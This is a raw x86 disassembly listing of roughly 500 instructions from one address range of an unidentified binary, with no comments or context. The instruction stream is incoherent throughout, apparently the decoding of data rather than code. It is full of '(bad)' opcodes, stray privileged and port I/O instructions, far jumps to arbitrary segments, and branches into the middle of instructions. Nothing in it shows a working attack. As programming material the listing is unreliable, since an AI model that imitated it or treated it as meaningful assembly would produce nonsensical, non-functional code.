  421d7e:	or     al,0xcc
  421d80:	jmp    0x6f07c9b8
  421d85:	pusha  
  421d86:	mov    ecx,0xdb602bf3
  421d8b:	pop    edi
  421d8c:	and    ch,BYTE PTR [ebp+0x50]
  421d8f:	jge    0x421d82
  421d91:	inc    ebx
  421d92:	sub    bh,0xbf
  421d95:	cvtdq2ps xmm1,XMMWORD PTR [edi]
  421d98:	mov    WORD PTR [edi+ebx*1+0x65],?
  421d9c:	pushf  
  421d9d:	or     eax,0x48f440c
  421da2:	add    BYTE PTR [eax+esi*1],bl
  421da5:	sub    eax,0x390b10f0
  421daa:	adc    dh,BYTE PTR [eax+0x1e]
  421dad:	ins    DWORD PTR es:[edi],dx
  421dae:	cld    
  421daf:	xchg   ebp,eax
  421db0:	xor    eax,0x837ff0fe
  421db5:	jb     0x421daa
  421db7:	lods   al,BYTE PTR ds:[esi]
  421db8:	and    al,0x95
  421dba:	int    0xc3
  421dbc:	mov    ds:0xff559125,eax
  421dc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421dc2:	or     dl,BYTE PTR [ebx]
  421dc4:	cmp    DWORD PTR [ecx+0x69],esp
  421dc7:	mov    al,ds:0x50e072f2
  421dcc:	push   ebp
  421dcd:	sub    ebp,edi
  421dcf:	bnd addr16 jp 0x421e0d
  421dd3:	adc    eax,0x595e2d59
  421dd8:	push   es
  421dd9:	shl    DWORD PTR [edx-0x5e8027ce],0xca
  421de0:	mov    dh,0xae
  421de2:	inc    edi
  421de3:	cmp    ebp,DWORD PTR [esi+0x2b3a6d68]
  421de9:	dec    esi
  421dea:	cmp    edx,ecx
  421dec:	repz call 0x32b0:0x8ed69ff
  421df4:	ja     0x421e1c
  421df6:	test   al,0xcc
  421df8:	es pop ecx
  421dfa:	retf   0x2ec6
  421dfd:	inc    ebx
  421dfe:	push   es
  421dff:	adc    al,0xb3
  421e01:	scas   al,BYTE PTR es:[edi]
  421e02:	cmp    esi,DWORD PTR [ebp-0x22]
  421e05:	setne  ch
  421e08:	fidiv  WORD PTR [edx]
  421e0a:	in     al,0x8
  421e0c:	out    dx,al
  421e0d:	and    BYTE PTR [ebx+0x57010b84],0x10
  421e14:	sub    DWORD PTR [ebx],esi
  421e16:	push   edi
  421e17:	add    al,0xbb
  421e19:	cmp    BYTE PTR [ecx-0x1c70aea0],0xcc
  421e20:	sbb    eax,0xaf9a9959
  421e25:	or     DWORD PTR [esp+eiz*8],eax
  421e28:	mov    al,gs:0x119c45cf
  421e2e:	adc    edx,ebx
  421e30:	mov    ebp,DWORD PTR [ecx+0x1739a5ac]
  421e36:	pop    edi
  421e37:	mov    ch,0xa3
  421e39:	lea    edi,[edi-0x1f875cd6]
  421e3f:	imul   esi,DWORD PTR [edx-0x67cabd13],0xffffff88
  421e46:	inc    ecx
  421e47:	aam    0x38
  421e49:	popa   
  421e4a:	icebp  
  421e4b:	sub    eax,0x457a4ef4
  421e50:	outs   dx,BYTE PTR ds:[esi]
  421e51:	adc    ecx,esp
  421e53:	add    dl,BYTE PTR [ebx-0x34063dc8]
  421e59:	mov    bl,0xf7
  421e5b:	sub    BYTE PTR [ebp-0x7fc3f500],cl
  421e61:	cmp    DWORD PTR [eax-0x48],eax
  421e64:	mov    ds:0xaf9a98e1,al
  421e69:	mov    ecx,0xa8159827
  421e6e:	test   al,0x5b
  421e70:	xchg   edi,eax
  421e71:	pop    ebp
  421e72:	xchg   esp,eax
  421e73:	sbb    DWORD PTR [edi+0x37d71343],edx
  421e79:	jno    0x421ee3
  421e7b:	gs (bad) 
  421e7d:	lock adc BYTE PTR [esi-0x2e],dh
  421e81:	sub    eax,0x336a7ba3
  421e86:	or     BYTE PTR [ebp-0x4d3137ea],0x33
  421e8d:	inc    eax
  421e8e:	pop    ebp
  421e8f:	lock push eax
  421e91:	ja     0x421e91
  421e93:	xchg   cx,ax
  421e95:	(bad)  
  421e96:	jmp    0x421eac
  421e98:	loopne 0x421ea7
  421e9a:	sbb    dh,BYTE PTR [edi]
  421e9c:	fidivr WORD PTR [ecx+0x46]
  421e9f:	fs call 0xa974:0x3682a9c8
  421ea7:	pop    ds
  421ea8:	xor    ebp,DWORD PTR [eax]
  421eaa:	push   ecx
  421eab:	cwde   
  421eac:	jmp    0x421f0a
  421eae:	mov    bh,0x49
  421eb0:	sub    DWORD PTR [ebx],ebp
  421eb2:	lods   al,BYTE PTR ds:[esi]
  421eb3:	icebp  
  421eb4:	stos   BYTE PTR es:[edi],al
  421eb5:	aad    0x55
  421eb7:	sahf   
  421eb8:	fst    DWORD PTR [edx-0x30]
  421ebb:	test   al,0x8f
  421ebd:	sub    BYTE PTR [ebx+0x25],bh
  421ec0:	ja     0x421ead
  421ec2:	inc    ecx
  421ec3:	ficom  WORD PTR [ebx-0x1a]
  421ec6:	push   ecx
  421ec7:	je     0x421f2b
  421ec9:	rcr    esi,cl
  421ecb:	test   eax,0xede2ad07
  421ed0:	inc    ecx
  421ed1:	lahf   
  421ed2:	fisttp WORD PTR [ebp-0x4d982c00]
  421ed8:	jns    0x421ef8
  421eda:	js     0x421f37
  421edc:	out    dx,al
  421edd:	retf   0xe9ba
  421ee0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ee1:	addr16 fmul st(1),st
  421ee4:	clc    
  421ee5:	sahf   
  421ee6:	test   BYTE PTR [ebx+0x45],bh
  421ee9:	cld    
  421eea:	scas   al,BYTE PTR es:[edi]
  421eeb:	jne    0x421ebf
  421eed:	fimul  DWORD PTR [esp+esi*8+0x11]
  421ef1:	xchg   DWORD PTR [edi+edi*2],esp
  421ef4:	jge    0x421e79
  421ef6:	fs add dh,ch
  421ef9:	shr    esi,0x12
  421efc:	push   edx
  421efd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421efe:	fidivr WORD PTR [ecx+0x34]
  421f01:	push   ds
  421f02:	aaa    
  421f03:	mov    bh,0x50
  421f05:	mov    ch,0xbb
  421f07:	xor    eax,0xa528530c
  421f0c:	arpl   cx,ax
  421f0e:	fsub   st,st(5)
  421f10:	cdq    
  421f11:	adc    dh,bh
  421f13:	jne    0x421f2c
  421f15:	inc    ebx
  421f16:	in     eax,0x87
  421f18:	jmp    0xda2e:0x78cc6629
  421f1f:	pop    ecx
  421f20:	stos   BYTE PTR es:[edi],al
  421f21:	or     esp,DWORD PTR [ecx+0x10]
  421f24:	rcr    DWORD PTR [edx+0x2],0xe
  421f28:	mov    al,ds:0x7aab581d
  421f2d:	jl     0x421ef8
  421f2f:	xor    al,0xad
  421f31:	cmp    eax,0x2c57369a
  421f36:	cmp    al,0x84
  421f38:	mov    bh,0x79
  421f3a:	cmp    dh,BYTE PTR [edx]
  421f3c:	imul   ebp,DWORD PTR [edx+0x15],0x26
  421f40:	add    esi,edx
  421f42:	cmp    eax,esi
  421f44:	inc    ebx
  421f45:	mov    cl,0xd4
  421f47:	push   edi
  421f48:	mov    dl,0x4b
  421f4a:	das    
  421f4b:	fsubr  st(2),st
  421f4d:	adc    al,BYTE PTR [ecx-0x31dfe996]
  421f53:	shr    DWORD PTR [eax+eax*8+0x65cb33fc],cl
  421f5a:	test   eax,0xd6043856
  421f5f:	ret    
  421f60:	xchg   ebp,eax
  421f61:	nop
  421f62:	test   BYTE PTR [ebp-0x65c98ab2],cl
  421f68:	push   edx
  421f69:	xlat   BYTE PTR ds:[ebx]
  421f6a:	adc    BYTE PTR ds:0xc01862f9,dh
  421f70:	fistp  DWORD PTR es:[edx]
  421f73:	mov    ds:0xea2570e8,eax
  421f78:	dec    esi
  421f79:	repnz pop edi
  421f7b:	jp     0x421f72
  421f7d:	mov    eax,0xdaf45bae
  421f82:	sbb    eax,0xbbbc1d08
  421f87:	scas   eax,DWORD PTR es:[edi]
  421f88:	out    dx,eax
  421f89:	rcr    DWORD PTR [esi],1
  421f8b:	retf   0x4012
  421f8e:	pop    ebp
  421f8f:	xor    DWORD PTR [ecx-0x34],0x2018cdfa
  421f96:	jae    0x421ffc
  421f98:	ja     0x421fe5
  421f9a:	lods   al,BYTE PTR ds:[esi]
  421f9b:	sbb    BYTE PTR [ecx-0x53],ch
  421f9e:	mov    ebx,0x6f2305a0
  421fa3:	sbb    DWORD PTR [ebx-0x4fd7e863],esi
  421fa9:	push   es
  421faa:	or     eax,0xc9ae8e07
  421faf:	mov    BYTE PTR [eax+ebx*2-0x6714c89d],ch
  421fb6:	jecxz  0x421fb7
  421fb8:	mov    ecx,0x8f716ae1
  421fbd:	ja     0x421ff8
  421fbf:	ins    BYTE PTR es:[edi],dx
  421fc0:	mov    edx,0xe2416632
  421fc5:	pop    esi
  421fc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421fc7:	sub    eax,0x623c316
  421fcc:	xchg   esi,eax
  421fcd:	xchg   esi,eax
  421fce:	mov    eax,ds:0x949e32b0
  421fd3:	adc    al,0x5b
  421fd5:	and    eax,0x29b85b19
  421fda:	sub    al,0xa7
  421fdc:	fild   WORD PTR [edx]
  421fde:	dec    eax
  421fdf:	pop    ebp
  421fe0:	jno    0x421fb6
  421fe2:	fucomip st,st(2)
  421fe4:	push   cs
  421fe5:	inc    edi
  421fe6:	push   ss
  421fe7:	push   edi
  421fe8:	imul   ebp,DWORD PTR [eax-0x28b896d5],0x35c4b011
  421ff2:	sub    esi,DWORD PTR [ebx]
  421ff4:	adc    ecx,DWORD PTR [edi-0x27c0c87f]
  421ffa:	xlat   BYTE PTR ds:[ebx]
  421ffb:	into   
  421ffc:	out    dx,eax
  421ffd:	pop    esp
  421ffe:	in     eax,0xb1
  422000:	leave  
  422001:	add    ah,BYTE PTR [ecx]
  422003:	pop    ds
  422004:	into   
  422005:	mov    DWORD PTR [esi],ecx
  422007:	xchg   esi,eax
  422008:	push   eax
  422009:	or     al,0x4b
  42200b:	scas   eax,DWORD PTR es:[edi]
  42200c:	lock sbb DWORD PTR [edi],eax
  42200f:	xor    al,0xe
  422011:	inc    ebp
  422012:	ficomp WORD PTR [eax+ebx*2]
  422015:	jbe    0x42207e
  422017:	add    eax,0xf908090a
  42201c:	aas    
  42201d:	in     al,0x90
  42201f:	jmp    0xf1dfde11
  422024:	mov    DWORD PTR [edi+0x3f],eax
  422027:	and    ch,BYTE PTR [edi]
  422029:	mov    al,ds:0xd5ffe770
  42202e:	test   ah,0x45
  422031:	aad    0x4f
  422033:	pop    ds
  422034:	pop    ss
  422035:	cmc    
  422036:	stc    
  422037:	test   ebp,edx
  422039:	call   0x6f85:0xea8b888e
  422040:	mov    al,0xbd
  422042:	sub    edx,DWORD PTR [ebx+eax*2-0x2a604a72]
  422049:	aaa    
  42204a:	or     dh,ah
  42204c:	adc    BYTE PTR [ebp-0x7],dh
  42204f:	mov    ebp,0x514ee614
  422054:	adc    eax,0x72640bbf
  422059:	xchg   DWORD PTR [edx+0x10],eax
  42205c:	out    0x6d,al
  42205e:	xor    ecx,DWORD PTR [ecx]
  422060:	(bad)  
  422061:	scas   eax,DWORD PTR es:[edi]
  422062:	lods   eax,DWORD PTR ds:[esi]
  422063:	inc    ecx
  422064:	stos   BYTE PTR es:[edi],al
  422065:	inc    esp
  422066:	aaa    
  422067:	push   esp
  422068:	push   0x8e3fcfeb
  42206d:	mov    ah,0xb0
  42206f:	xlat   BYTE PTR ds:[ebx]
  422070:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  422072:	adc    dl,BYTE PTR ds:0x5239d86e
  422078:	mov    BYTE PTR [edx+ebp*1-0x12fb8804],dl
  42207f:	in     eax,dx
  422080:	push   es
  422081:	pop    ecx
  422082:	xor    al,0xb9
  422084:	test   DWORD PTR [eax+0xdee8548],edi
  42208a:	fwait
  42208b:	pop    esi
  42208c:	or     DWORD PTR [edi+eiz*4],edx
  42208f:	outs   dx,DWORD PTR ds:[esi]
  422090:	js     0x422048
  422092:	test   BYTE PTR [esi-0x5c80f516],0x9c
  422099:	pop    ecx
  42209a:	dec    edx
  42209b:	arpl   ax,ax
  42209d:	rcl    BYTE PTR [ebx-0x57263f0a],0x3b
  4220a4:	push   ds
  4220a5:	lods   al,BYTE PTR ds:[esi]
  4220a6:	bound  edx,QWORD PTR [edi]
  4220a8:	add    al,0xef
  4220aa:	xchg   ebx,eax
  4220ab:	ins    DWORD PTR es:[edi],dx
  4220ac:	jae    0x422044
  4220ae:	ins    DWORD PTR es:[edi],dx
  4220af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220b0:	mul    BYTE PTR [ebx+0x7147be96]
  4220b6:	adc    DWORD PTR [esi-0x260cd435],esi
  4220bc:	mov    ds,WORD PTR [eax]
  4220be:	mov    ch,0x5b
  4220c0:	mov    edi,0x8906e6a7
  4220c5:	bound  esi,QWORD PTR [edx-0x25]
  4220c8:	add    eax,0xb8a03a1a
  4220cd:	idiv   ch
  4220cf:	aaa    
  4220d0:	pushf  
  4220d1:	dec    ebp
  4220d2:	bound  esi,QWORD PTR [esp+ebp*2-0x5f0cccdc]
  4220d9:	bswap  ebx
  4220db:	outs   dx,DWORD PTR ds:[esi]
  4220dc:	push   edx
  4220dd:	test   al,0x65
  4220df:	cmp    eax,0x3c6f1ae2
  4220e5:	push   es
  4220e6:	lock lock aaa 
  4220e9:	in     al,dx
  4220ea:	into   
  4220eb:	xchg   esi,eax
  4220ec:	lods   al,BYTE PTR ds:[esi]
  4220ed:	test   eax,0xd8c0ff82
  4220f2:	addr16 test al,0x78
  4220f5:	and    BYTE PTR [edx+eax*2-0x16cc3e7f],dl
  4220fc:	push   ss
  4220fd:	mov    ds:0x3a80aa15,eax
  422102:	sbb    dh,bh
  422104:	mov    dh,0x78
  422106:	inc    esp
  422107:	pop    ebp
  422108:	cdq    
  422109:	cmp    ah,ch
  42210b:	mov    eax,0x1eeb6674
  422110:	aad    0x5b
  422112:	lds    edi,FWORD PTR [eax-0x5b1a2d73]
  422118:	jecxz  0x422199
  42211a:	mov    ds:0x8fab1c4c,eax
  42211f:	pop    esp
  422120:	ret    
  422121:	hlt    
  422122:	mov    ah,ah
  422124:	add    eax,0x43af86da
  422129:	(bad)  
  42212a:	sbb    al,BYTE PTR [ecx-0x309b0ecf]
  422130:	stos   DWORD PTR es:[edi],eax
  422131:	or     BYTE PTR [edx],dh
  422133:	aam    0x99
  422135:	or     al,0x2f
  422137:	jo     0x4220bd
  422139:	repnz in eax,0x3d
  42213c:	imul   ecx,DWORD PTR [ecx+0x7e],0xffffffab
  422140:	inc    ecx
  422141:	add    eax,0x4687026d
  422146:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422147:	sbb    BYTE PTR [ebp-0xf6c3090],dl
  42214d:	popa   
  42214e:	outs   dx,DWORD PTR ds:[esi]
  42214f:	in     al,dx
  422150:	in     al,0xd3
  422152:	cmp    ecx,DWORD PTR [edx+0x15]
  422155:	push   ebx
  422156:	hlt    
  422157:	add    eax,0xb2dea0ee
  42215c:	push   cs
  42215d:	inc    esp
  42215e:	pop    ss
  42215f:	push   0x4b8106e1
  422164:	(bad)  
  422165:	pop    ebp
  422166:	push   0xd5ff1397
  42216b:	fsub   QWORD PTR [eax+0x17017cec]
  422171:	dec    ebp
  422172:	ds fwait
  422174:	shl    DWORD PTR [edi-0x75],1
  422177:	fcom   QWORD PTR [ebp+esi*2-0x200114a1]
  42217e:	sar    BYTE PTR [ecx+ebp*4+0x24],cl
  422182:	jmp    0x4221a5
  422184:	imul   ebp,DWORD PTR [ebx-0x5cac5377],0x838b3f11
  42218e:	arpl   sp,sp
  422190:	mov    WORD PTR [edi-0x1c],es
  422193:	sub    esp,ecx
  422195:	jle    0x422147
  422197:	cwde   
  422198:	add    DWORD PTR [edi+0xa],ecx
  42219b:	out    0xd3,al
  42219d:	inc    edi
  42219e:	loop   0x4221d1
  4221a0:	inc    ebp
  4221a1:	test   ebp,0x26dbffe4
  4221a7:	mov    bh,0x3d
  4221a9:	and    ecx,edx
  4221ab:	mov    ebx,0x459a4b91
  4221b0:	mov    ch,0xc7
  4221b2:	add    BYTE PTR [eax-0x2d],ch
  4221b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4221b6:	push   0xdcfd358f
  4221bb:	xor    ebp,DWORD PTR [esi-0x43]
  4221be:	fcom   QWORD PTR ds:[edi-0x20]
  4221c2:	fsub   DWORD PTR [ebx]
  4221c4:	inc    ecx
  4221c5:	daa    
  4221c6:	mov    esi,0x345f5bdf
  4221cb:	sbb    bl,BYTE PTR [ebx+0x49]
  4221ce:	mov    fs,WORD PTR [ebx+0x3e]
  4221d1:	shr    DWORD PTR [ebx+0x57],0xb5
  4221d5:	mov    eax,0xf2115473
  4221da:	not    DWORD PTR [esi]
  4221dc:	mov    esp,0x885a6134
  4221e1:	sahf   
  4221e2:	scas   al,BYTE PTR es:[edi]
  4221e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221e4:	xchg   edi,eax
  4221e5:	es mov edi,0x44eb6384
  4221eb:	les    esi,FWORD PTR [esi-0x40]
  4221ee:	xor    eax,0x29b80e58
  4221f3:	fnstcw WORD PTR [eax+0x183a96d9]
  4221f9:	xchg   ebx,eax
  4221fa:	retf   0x29a4
  4221fd:	sbb    eax,0x84b1b29b
  422202:	push   esi
  422203:	add    BYTE PTR [esi+0x6b],0x2a
  422207:	jnp    0x422260
  422209:	scas   eax,DWORD PTR es:[edi]
  42220a:	(bad)  
  42220b:	lods   eax,DWORD PTR ds:[esi]
  42220c:	sti    
  42220d:	xchg   eax,ebx
  42220f:	bound  ebx,QWORD PTR [ecx]
  422211:	xor    al,0x74
  422213:	cld    
  422214:	pop    es
  422215:	xchg   DWORD PTR [ecx+0x15],edx
  422218:	out    0x5b,eax
  42221a:	pop    es
  42221b:	ss popa 
  42221d:	jb     0x4221a5
  42221f:	mov    dh,BYTE PTR [ebx+0x2d]
  422222:	test   BYTE PTR [edi+0x31],ah
  422225:	sub    ch,BYTE PTR [eax-0x2667fe35]
  42222b:	sbb    BYTE PTR [edi+0xf],dh
  42222e:	mov    bl,dl
  422230:	js     0x422239
  422232:	xchg   edx,eax
  422233:	imul   edi,DWORD PTR [edx-0x27713006],0xfa234221
  42223d:	push   eax
  42223e:	add    eax,0x73da9652
  422243:	sbb    DWORD PTR [esi],0x57
  422246:	ret    
  422247:	fisubr DWORD PTR [eax]
  422249:	xchg   esp,eax
  42224a:	outs   dx,DWORD PTR ds:[esi]
  42224b:	in     eax,dx
  42224c:	mov    bl,0xf2
  42224e:	ror    BYTE PTR [edi],0x19
  422251:	popa   
  422252:	cmp    WORD PTR [bp+si],dx
  422256:	clc    
  422257:	pushf  
  422258:	in     eax,dx
  422259:	mov    ebx,0x1e023d7a
  42225e:	int3   
  42225f:	dec    esi
  422260:	test   BYTE PTR [edi],0x19
  422263:	daa    
  422264:	push   0x25d7c435
  422269:	mov    dl,0x56
  42226b:	stc    
  42226c:	inc    edx
  42226d:	(bad)  
  42226e:	pop    edx
  42226f:	into   
  422270:	push   ecx
  422271:	lds    esp,FWORD PTR [esi]
  422273:	xor    BYTE PTR [ebp+eax*8-0x1],bl
  422277:	add    dl,al
  422279:	dec    edi
  42227a:	sub    dh,BYTE PTR [eax]
  42227c:	mov    al,0xb4
  42227e:	add    BYTE PTR [ecx],ah
  422280:	fild   DWORD PTR [ebx+esi*1]
  422283:	cmp    al,0x3b
  422285:	dec    edx
  422286:	das    
  422287:	stos   DWORD PTR es:[edi],eax
  422288:	inc    ecx
  422289:	dec    esp
  42228a:	popf   
  42228b:	add    ebx,DWORD PTR [ebp-0x5f6d5be7]
  422291:	outs   dx,DWORD PTR ds:[esi]
  422292:	push   esp
  422293:	and    esp,esi
  422295:	int    0xb4
  422297:	dec    edx
  422298:	dec    edx
  422299:	add    eax,0xfd76b7ad
  42229e:	sbb    dl,bl
  4222a0:	sbb    al,0x71
  4222a2:	data16 and al,0x26
  4222a5:	nop
  4222a6:	xlat   BYTE PTR ds:[ebx]
  4222a7:	das    
  4222a8:	fwait
  4222a9:	popa   
  4222aa:	(bad)  
  4222ab:	out    dx,al
  4222ac:	sub    eax,0x96daede1
  4222b1:	addr16 push ecx
  4222b3:	not    DWORD PTR [ecx]
  4222b5:	xor    eax,0x57e4d460
  4222ba:	or     ah,BYTE PTR [ecx+0x68]
  4222bd:	jmp    DWORD PTR [bp+di]
  4222c0:	imul   eax,DWORD PTR [edi+0x18aca1d],0xbadd1da5
  4222ca:	mov    DWORD PTR [edi-0x6a],edi
  4222cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4222ce:	icebp  
  4222cf:	inc    ecx
  4222d0:	mov    ebx,0x7e8b8650
  4222d5:	es (bad) 
  4222d7:	push   ss
  4222d8:	ins    DWORD PTR es:[edi],dx
  4222d9:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4222db:	or     al,0x6d
  4222dd:	and    ah,cl
  4222df:	out    0x4a,al
  4222e1:	retf   
  4222e2:	sahf   
  4222e3:	daa    
  4222e4:	stos   DWORD PTR es:[edi],eax
  4222e5:	popf   
  4222e6:	pop    ss
  4222e7:	rcl    BYTE PTR [ebx+0x14],cl
  4222ea:	xlat   BYTE PTR ds:[ebx]
  4222eb:	add    al,0x99
  4222ed:	pusha  
  4222ee:	out    dx,al
  4222ef:	jb     0x42233b
  4222f1:	add    al,0x5b
  4222f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4222f4:	and    ebx,DWORD PTR [edx-0x64]
  4222f7:	out    0x9,al
  4222f9:	loopne 0x42228e
  4222fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4222fc:	push   ds
  4222fd:	and    BYTE PTR [ebp+0x74],0xa4
  422301:	shl    BYTE PTR ds:0xdf3b1f5,cl
  422307:	ds mov edx,0x43db8caa
  42230d:	shr    edx,cl
  42230f:	(bad)  
  422311:	mov    esp,0xd571503f
  422316:	add    eax,0x17f41196
  42231b:	je     0x42233d
  42231d:	lea    eax,[ecx+0x3dcea42]
  422323:	mov    dh,0xac
  422325:	pop    ss
  422326:	and    esi,DWORD PTR [edi+eax*1]
  422329:	xor    eax,0x4c448f24
  42232e:	ja     0x4222f2
  422330:	push   ebp
  422331:	jnp    0x4222b9
  422333:	test   BYTE PTR [edi-0x5bc093e7],ah
  422339:	mov    ah,0x5c
  42233b:	push   eax
  42233c:	bnd jmp 0x82caccd4
  422342:	or     BYTE PTR [eax+0x44ba5280],0x20
  422349:	icebp  
  42234a:	lods   al,BYTE PTR ds:[esi]
  42234b:	add    eax,0x73211bb0
  422350:	test   BYTE PTR [edi+ecx*2-0x44],0x8f
  422355:	inc    BYTE PTR [eax+0x2c]
  422358:	cmp    ah,dh
  42235a:	and    DWORD PTR [edx-0x200db9b9],0x18
  422361:	jp     0x4223b8
  422363:	in     al,dx
  422364:	pop    edx
  422365:	das    
  422366:	cmp    ch,BYTE PTR [ecx-0x4]
  422369:	(bad)  
  42236a:	jno    0x4222fd
  42236c:	pop    esp
  42236d:	pop    DWORD PTR [ebx]
  42236f:	loope  0x422399
  422371:	xchg   ebx,eax
  422372:	inc    esi
  422373:	dec    esi
  422374:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422375:	pop    edx
  422376:	or     esi,ebp
  422378:	mov    ebp,0x640d7e59
  42237d:	push   ss
  42237e:	adc    al,BYTE PTR [esi+edi*8+0x2d8be711]
  422385:	fcomp  st(0)
  422387:	fs cmp eax,0xbe377bf5
  42238d:	ret    0x3310
  422390:	xor    ecx,DWORD PTR [ebp+edi*1+0x6f]
  422394:	cdq    
  422395:	in     eax,dx
  422396:	inc    eax
  422397:	int3   
  422398:	sub    BYTE PTR [eax-0x4ae85d07],ch
  42239e:	adc    dl,ah
  4223a0:	mov    ch,0x57
  4223a2:	mov    eax,0x580e33b6
  4223a7:	mov    ebp,0x5066025a
  4223ac:	mov    edi,0xf600ea38
  4223b1:	sbb    al,BYTE PTR [esi]
  4223b3:	out    0x6c,al
  4223b5:	(bad)  [edi-0x72]
  4223b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223b9:	(bad)  
  4223ba:	ins    BYTE PTR es:[edi],dx
  4223bb:	loopne 0x42235e
  4223bd:	add    DWORD PTR [eax+edx*2],esi
  4223c0:	es or  al,0x4b
  4223c3:	sbb    eax,0xd6d2b5ad
  4223c8:	or     DWORD PTR [ebx-0x5c7014b8],esp
  4223ce:	fwait
  4223cf:	out    0x1b,eax
  4223d1:	scas   al,BYTE PTR es:[edi]
  4223d2:	jo     0x4223a1
  4223d4:	popa   
  4223d5:	test   eax,0x3b526bb8
  4223da:	add    al,0x54
  4223dc:	cdq    
  4223dd:	and    dh,0x8e
  4223e0:	sub    BYTE PTR [eax],0xf7
  4223e3:	cwde   
  4223e4:	ror    BYTE PTR [esi+0x60],0x24
  4223e8:	or     bl,BYTE PTR [ecx-0x27c1c134]
  4223ee:	jmp    FWORD PTR [ecx+0xa724632]
  4223f4:	jmp    0x4223b8
  4223f6:	mov    bh,BYTE PTR [esi-0x5215baad]
  4223fc:	ret    0x8b3e
  4223ff:	leave  
  422400:	sbb    edx,edx
  422402:	adc    eax,0xababbf3b
  422407:	frstor [esi-0x75]
  42240a:	mov    dl,0xb
  42240c:	and    al,0x61
  42240e:	jl     0x4223ab
  422410:	pop    edx
  422411:	cmc    
  422412:	in     eax,dx
  422413:	inc    ecx
  422414:	or     ebp,DWORD PTR ds:0xce0b640c
  42241a:	(bad)  
  42241c:	mov    ds:0x87ba6a08,al
  422421:	js     0x4223f8
  422423:	cli    
  422424:	nop
  422425:	(bad)  
  422426:	hlt    
  422427:	cmp    DWORD PTR [edi],0x6b
  42242a:	and    ah,bh
  42242c:	push   es
  42242d:	cmc    
  42242e:	push   ecx
  42242f:	and    BYTE PTR [ebp+esi*4-0x717bbed3],bl
  422436:	pop    ss
  422437:	mov    ecx,0x24f181b3
  42243c:	cdq    
  42243d:	xor    ebp,DWORD PTR [ebp-0x3dae4c44]
  422443:	cmc    
  422444:	sub    eax,0xbcf03478
  422449:	ret    0x40f5
  42244c:	fs jne 0x4224a0
  42244f:	and    ebx,DWORD PTR [edx*8+0xac3f9af]
  422456:	repnz mov dl,BYTE PTR [eax-0x6c]
  42245a:	dec    eax
  42245b:	punpckhwd mm3,QWORD PTR [ebx-0x48]
  42245f:	iret   
  422460:	mov    edi,0x22def2c5
  422465:	je     0x422498
  422467:	lea    ecx,[ebx+0x458be0ca]
  42246d:	mov    ebx,0x121d3e97
  422472:	test   dl,bh
  422474:	dec    esi
  422475:	sub    al,BYTE PTR [edi]
  422477:	(bad)  
  422478:	loopne 0x422403
  42247a:	cmp    DWORD PTR [ebp-0x68],esp
  42247d:	mov    al,0x35
  42247f:	mul    BYTE PTR [ebp-0x28]
  422482:	inc    esi
  422483:	sub    BYTE PTR [eax],0x6b
  422486:	mov    ds:0x47db7a86,al
  42248b:	cmp    ch,dl
  42248d:	push   0x347ee57d
  422492:	lahf   
  422493:	hlt    
  422494:	push   ebp
  422495:	std    
  422496:	dec    esp
  422497:	push   ss
  422498:	fs xchg ecx,eax
  42249a:	pop    ecx
  42249b:	mov    bl,0x3a
  42249d:	pop    esp
  42249e:	push   es
  42249f:	ror    DWORD PTR [eax+0x78d57934],0x6b
  4224a6:	adc    al,0xd6
  4224a8:	mov    cl,0xbd
  4224aa:	jmp    0x4224af
  4224ac:	mov    edx,0xe1a6c983
  4224b1:	sahf   
  4224b2:	jmp    0xc8c8:0x21f0e3
  4224b9:	jno    0x4224df
  4224bb:	fild   WORD PTR [eax+esi*1-0x3d]
  4224bf:	mov    dh,0xce
  4224c1:	frstor [ebp-0x5a]
  4224c4:	jbe    0x4224f1
  4224c6:	clc    
  4224c7:	sbb    al,0x5f
  4224c9:	sub    dh,BYTE PTR [eax+0x7a]
  4224cc:	dec    ecx
  4224cd:	aad    0x7d
  4224cf:	(bad)  [eax+0x2b]
  4224d2:	loop   0x4224b8
  4224d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4224d5:	cmp    eax,0x53f3f6f0
  4224da:	adc    DWORD PTR [esi+0x28],edx
  4224dd:	rcr    DWORD PTR [esi],0x9e
  4224e0:	arpl   WORD PTR [ebx],sp
  4224e2:	jno    0x422498
  4224e4:	cmp    eax,0x69905828
  4224e9:	ror    DWORD PTR [edi-0x7d],cl
  4224ec:	(bad)  
  4224ed:	sbb    eax,0x6ca61d87
  4224f2:	fsubrp st(7),st
  4224f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224f5:	sbb    DWORD PTR [edi+esi*2+0x5],esi
  4224f9:	dec    ecx
  4224fa:	mov    WORD PTR [ebp-0x65],gs
  4224fd:	in     eax,0x4c
  4224ff:	xchg   ebp,eax
  422500:	push   cs
  422501:	jo     0x42249e
  422503:	pushf  
  422504:	push   ebx
  422505:	dec    esi
  422506:	jbe    0x4224bc
  422508:	jmp    0x422527
  42250a:	dec    ecx
  42250b:	add    BYTE PTR ds:0x18d86477,0xa0
  422512:	call   0x8ce1:0x7c5c8fb2
  422519:	push   esi
  42251a:	in     al,dx
  42251b:	ins    DWORD PTR es:[edi],dx
  42251c:	or     dh,0x8f
  42251f:	ins    DWORD PTR es:[edi],dx
  422520:	jbe    0x42255f
  422522:	leave  
  422523:	add    eax,0x1998919f
  422528:	dec    ecx
  422529:	mov    al,0xdc
  42252b:	inc    edi
  42252c:	gs ins DWORD PTR es:[edi],dx
  42252e:	mov    edi,esi
  422530:	ins    DWORD PTR es:[edi],dx
  422531:	mov    edi,0xbd0bedd1
  422536:	test   BYTE PTR [ebp+0x5d],0xdb
  42253a:	pop    eax
  42253b:	or     ch,BYTE PTR [ecx]
  42253d:	mov    ebx,0x138b6262
